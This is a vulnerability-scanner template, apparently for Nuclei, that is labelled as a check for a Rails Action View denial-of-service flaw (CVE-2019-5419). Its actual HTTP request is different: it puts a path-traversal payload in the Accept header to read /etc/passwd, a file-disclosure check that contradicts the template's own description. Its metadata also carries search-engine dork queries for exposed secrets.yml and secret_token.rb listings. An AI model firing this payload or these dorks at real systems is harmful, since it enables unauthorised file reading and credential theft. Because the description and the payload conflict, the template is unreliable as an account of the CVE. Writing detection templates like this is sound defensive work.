id: CVE-2019-5419

info:
  name: Rails Action View Denial of Service Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    There is a possible denial of service vulnerability in Action View (Rails) where specially crafted accept headers can cause action view to consume 100% CPU and make the server unresponsive.
  impact: |
    An attacker can exploit this vulnerability to exhaust server resources, leading to service disruption.
  remediation: |
    Upgrade to Rails Action View gem version 6.0.0 or higher to mitigate the vulnerability.
  reference:
    - http://lists.opensuse.org/opensuse-security-announce/2019-05/msg00011.html
    - http://lists.opensuse.org/opensuse-security-announce/2019-06/msg00025.html
    - http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00001.html
    - https://access.redhat.com/errata/RHSA-2019:0796
    - https://access.redhat.com/errata/RHSA-2019:1147
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2019-5419
    cwe-id: CWE-400,CWE-770
    epss-score: 0.00282
    epss-percentile: 0.69331
    cpe: cpe:2.3:a:rubyonrails:rails:*:*:*:*:*:*:*:*
  metadata:
    vendor: rubyonrails
    product: rails
    shodan-query:
      - cpe:"cpe:2.3:a:rubyonrails:rails"
      - http.title:"index of" "secret_token.rb"
      - http.title:"index of" "secrets.yml"
      - http.title:"index of" storage.yml
    fofa-query:
      - title="index of" "secret_token.rb"
      - title="index of" "secrets.yml"
      - title="index of" storage.yml
    google-query:
      - intitle:"index of" "secret_token.rb"
      - intitle:"index of" "secrets.yml"
      - intitle:"index of" storage.yml

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      Accept: "../../../../../../../../../../etc/passwd{{randstr}}"
    matchers:
      - type: word
        words:
          - "root:x"
        part: body
